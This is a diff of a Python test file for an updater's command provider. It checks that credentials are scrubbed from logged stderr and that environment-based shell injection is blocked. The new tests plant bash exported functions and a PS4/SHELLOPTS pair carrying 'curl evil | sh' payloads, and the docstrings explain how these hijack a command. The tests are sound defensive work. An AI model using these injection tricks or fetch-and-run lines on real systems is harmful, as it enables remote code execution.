@@ -602,15 +602,35 @@ class TestCommandProviderNoShellAndTimeout:
         ):
             assert await p.apply() is False
 
-    @pytest.mark.asyncio
-    async def test_apply_failure_redacts_stderr(self) -> None:
-        import types
+    # -- stderr redaction goes through the platform context --
+    #
+    # An installer failure is prime territory for a host-specific credential
+    # shape (an internal registry cookie, an SSO token in a fetch URL), and those
+    # live in a companion's regexes rather than in the OSS baseline. These assert
+    # the OBSERVABLE outcome -- what does and does not reach the log line -- and
+    # deliberately not "which redaction function was called": the previous
+    # version of this test stubbed the whole ``kiro_crew.security`` module and
+    # asserted two specific calls, so it pinned the old spelling rather than the
+    # guarantee, and any change of redactor broke it whether or not the log was
+    # still safe.
 
+    @staticmethod
+    def _install_policy(policy) -> None:
+        import dataclasses
+
+        from kiro_crew.config.loader import KiroCrewConfig
+        from kiro_crew.platform import PROFILE_ENTERPRISE, build_default_context, set_context
+
+        set_context(
+            dataclasses.replace(
+                build_default_context(KiroCrewConfig(), profile=PROFILE_ENTERPRISE),
+                credentials=policy,
+            )
+        )
+
+    async def _apply_with_stderr(self, stderr: bytes) -> None:
         p = CommandProvider(check_command="echo hi", apply_command="fail")
-        proc = _fake_proc(returncode=1, stderr=b"token=secret123 failed")
-        sec = types.ModuleType("kiro_crew.security")
-        sec.redact_credentials = MagicMock(side_effect=lambda t: (t, 0))  # type: ignore[attr-defined]
-        sec.redact_exfiltration_urls = MagicMock(side_effect=lambda t: (t, 0))  # type: ignore[attr-defined]
+        proc = _fake_proc(returncode=1, stderr=stderr)
         with (
             patch(
                 "kiro_crew.platform.update_provider._shell_exec_args",
@@ -621,11 +641,61 @@ class TestCommandProviderNoShellAndTimeout:
                 return_value="/usr/bin:/bin",
             ),
             patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)),
-            patch.dict(sys.modules, {"kiro_crew.security": sec}),
         ):
             assert await p.apply() is False
-        sec.redact_credentials.assert_called_once()
-        sec.redact_exfiltration_urls.assert_called_once()
+
+    @pytest.mark.asyncio
+    async def test_apply_failure_scrubs_stderr_through_the_context(
+        self, caplog: pytest.LogCaptureFixture
+    ) -> None:
+        from kiro_crew import security
+        from kiro_crew.platform import reset_context
+
+        class _Policy:
+            def redact(self, text: str) -> str:
+                return security.redact(text).replace("SSO-COOKIE", "[REDACTED-SSO]")
+
+        self._install_policy(_Policy())
+        try:
+            with caplog.at_level(logging.ERROR):
+                await self._apply_with_stderr(
+                    b"fetch rejected SSO-COOKIE=abc123 key=AKIAIOSFODNN7EXAMPLE"
+                )
+        finally:
+            reset_context()
+        logged = "\n".join(r.getMessage() for r in caplog.records)
+        assert "CommandProvider.apply: failed" in logged
+        # The companion's extra reach -- the whole point of routing via context.
+        assert "SSO-COOKIE" not in logged
+        # ...without losing the baseline pass underneath it.
+        assert "AKIAIOSFODNN7EXAMPLE" not in logged
+
+    @pytest.mark.asyncio
+    async def test_apply_failure_withholds_stderr_when_composition_fails(
+        self, caplog: pytest.LogCaptureFixture
+    ) -> None:
+        """A host that cannot compose its companion still reports the failure.
+
+        ``apply()`` must return False and log the return code -- the operator's
+        actionable part -- with only the untrusted stderr text withheld.
+        """
+        from kiro_crew.platform import PlatformCompositionError, reset_context
+        from kiro_crew.platform.context import LOG_WITHHELD_PLACEHOLDER
+
+        class _Unprovable:
+            def redact(self, text: str) -> str:
+                raise PlatformCompositionError("companion could not be composed")
+
+        self._install_policy(_Unprovable())
+        try:
+            with caplog.at_level(logging.ERROR):
+                await self._apply_with_stderr(b"fetch rejected token=secret123")
+        finally:
+            reset_context()
+        logged = "\n".join(r.getMessage() for r in caplog.records)
+        assert "rc=1" in logged
+        assert LOG_WITHHELD_PLACEHOLDER in logged
+        assert "secret123" not in logged
 
 
 class TestCancellationKillsUpdaterChild:
@@ -1449,3 +1519,53 @@ class TestCanApply:
         ) as argv:
             assert provider.can_apply() is True
         argv.assert_called_once_with("platform-apply")
+
+
+class TestShellCodeEnvStripping:
+    """An exported shell function shadows a command word outright.
+
+    ``_trusted_path_env`` narrows ``PATH`` so a planted binary cannot shadow the
+    operator's command word, but bash imports FUNCTIONS from the environment --
+    ``BASH_FUNC_<name>%%`` on 4.3+, ``BASH_FUNC_<name>()`` on the patched 4.2 --
+    and a function beats the ``PATH`` lookup entirely rather than competing in
+    it. The command runs through ``[<sh>, "-c", ...]``, so on any host whose
+    ``sh`` is bash this is reachable.
+    """
+
+    def test_exported_shell_functions_do_not_reach_the_update_command(self) -> None:
+        planted = {
+            "BASH_FUNC_acme-pkg%%": "() { curl evil | sh; }",
+            "BASH_FUNC_acme-pkg()": "() { curl evil | sh; }",
+            "BASH_FUNC_grep%%": "() { :; }",
+        }
+        with (
+            patch.dict(os.environ, {"PATH": "/usr/bin", "LANG": "C", **planted}),
+            patch(
+                "kiro_crew.platform.update_provider.trusted_system_path",
+                return_value="/usr/bin:/bin",
+            ),
+        ):
+            env = _trusted_path_env()
+        assert env is not None
+        leaked = sorted(k for k in env if k.startswith("BASH_FUNC_"))
+        assert not leaked, f"exported shell functions reached the child: {leaked}"
+        # The deliberate pass-through (proxy / locale / credential helpers) stays.
+        assert env["LANG"] == "C"
+
+    def test_the_shell_tracing_pair_does_not_reach_the_update_command(self) -> None:
+        # SHELLOPTS switches xtrace on and PS4 is expanded with command
+        # substitution, so a payload in PS4 runs before the command does.
+        with (
+            patch.dict(
+                os.environ,
+                {"PATH": "/usr/bin", "SHELLOPTS": "xtrace", "PS4": "$(curl evil | sh)"},
+            ),
+            patch(
+                "kiro_crew.platform.update_provider.trusted_system_path",
+                return_value="/usr/bin:/bin",
+            ),
+        ):
+            env = _trusted_path_env()
+        assert env is not None
+        assert "SHELLOPTS" not in env
+        assert "PS4" not in env
